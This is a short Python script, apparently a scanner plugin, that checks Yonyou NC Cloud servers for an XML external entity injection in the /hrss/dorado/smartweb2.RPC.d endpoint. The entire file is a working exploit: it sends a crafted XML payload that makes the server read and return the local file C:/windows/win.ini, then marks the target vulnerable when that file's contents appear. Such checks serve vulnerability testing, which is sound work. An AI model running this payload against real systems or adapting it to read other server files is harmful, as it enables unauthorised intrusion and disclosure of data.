import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = '''__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>'''
    vurl = urllib.parse.urljoin(url, "/hrss/dorado/smartweb2.RPC.d?__rpc=true")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '[fonts]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult